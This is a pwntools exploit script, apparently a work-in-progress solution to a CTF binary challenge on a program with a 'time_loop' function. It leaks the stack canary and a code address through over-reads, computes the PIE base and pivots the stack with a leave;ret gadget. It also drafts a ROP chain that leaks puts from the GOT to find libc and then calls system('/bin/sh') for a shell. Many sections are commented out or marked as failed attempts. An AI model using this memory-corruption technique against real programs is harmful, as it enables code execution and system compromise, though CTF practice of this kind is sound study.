from pwn import * 

binary = "./program_patched"
p = process(binary)
#p = remote("chal.firebird.sh", 35037)
elf = ELF(binary)
s = 'b * time_loop+234'
gdb.attach(p, s)

libc = ELF("libc.so.6")
context.binary = binary

    # first day
p.recvuntil(b"hours remaining\n")
p.send(b'A' * 25 )
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
# Method 2: Using bytes directly
canary_bytes = output[24:32]
canary = u64(canary_bytes)
canary = canary & 0xffffffffffffff00  # Mask out the last byte
#print(canary)
#print(hex(canary))


# Second day 
p.recvuntil(b"hours remaining\n")
p.send(b'B' * 24 + b'C' * 16) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
#print(output)
return_addr = output[40:46].ljust(8, b'\x00')
#print(return_addr)
return_addr = u64(return_addr)
# timeloop_address = return_addr - rip offset + timeloop offset
'''
base_addr = return_addr & ~0xfff
timeloop_address = base_addr + elf.sym['time_loop']
'''
base_addr = return_addr - 0x1373 # is the offset from base
timeloop_address = base_addr + 0x11e9
#print(elf.sym['time_loop']) # prints 4585, 11e9
#print(hex(base_addr))
#print(hex(timeloop_address))

# Last day, trying to loop back lol 
'''
p.send(b'B' * 24 + p64(canary) + b'C' * 8 + p64(timeloop_address)) # prevsering canary 
'''
# 0x0000000000001403 pop rdi gadget offset
# base_addr + 0x0000000000001403 is porbably it
leave_ret = base_addr + 0x00000000000012d3
new_stack_addr = elf.bss() + 0x800 + base_addr
payload = flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    p64(new_stack_addr), # padding to get to return address 
    # leak libc function address
    #p64(base_addr + 0x000000000001403),
    #p64(elf.got['puts'] + base_addr),
    #p64(elf.plt['puts'] + base_addr),
    # go back to same function to write more
    p64(leave_ret)
)
p.send(payload)

payload2 = flat(
    b'A' * 8, # fake rbp
    p64(base_addr + 0x000000000001403),
    p64(elf.got['puts'] + base_addr),
    p64(elf.plt['puts'] + base_addr),
    p64(base_addr + 0x000000000001403),
    p64(3),
    p64(timeloop_address)

)
'''
# new loop first day
p.recvuntil(b"hours remaining\n")
p.send(b'D' * 32)  # Send enough to see the saved rbp
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
rbp = u64(output[32:40])  # Adjust offset as needed
buffer_addr = rbp - 0x20  # This is our actual buffer address

'''
# New loop Second day, now we leak rbp value, WAIT NO WE CAN LEAK LIBC ADDRESSES ALREADY, no we can't lol


'''
# New loop last day, now we do the trick 
payload = flat(
    p64(base_addr + 0x000000000001403),
    p64(3),
    p64(timeloop_address), # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address 
    # leak libc function address
    #p64(base_addr + 0x000000000001403),
    #p64(elf.got['puts'] + base_addr),
    #p64(elf.plt['puts'] + base_addr),
    # go back to same function to write more
    p64(base_addr + 0x000000000000101a),
    p64(buffer_addr),

)
p.send(payload)

p.recvuntil(b"hours remaining\n")
p.send(payload)
p.recvuntil(b"3 days have passed")
GOT_leak = int.from_bytes(p.recvuntil(b"\n", drop = True), "little")
#print(hex(GOT_leak))

libc.address = GOT_leak - libc.sym['puts'] 
print(hex(libc.address))




payload2 =flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address 
    p64(base_addr + 0x000000000000101a),
    p64(base_addr + 0x000000000001403),
    next(libc.search('/bin/sh')),
    p64(libc.sym['system'])
)
p.recvuntil(b"hours remaining\n")
p.send(payload2)
'''

p.interactive()
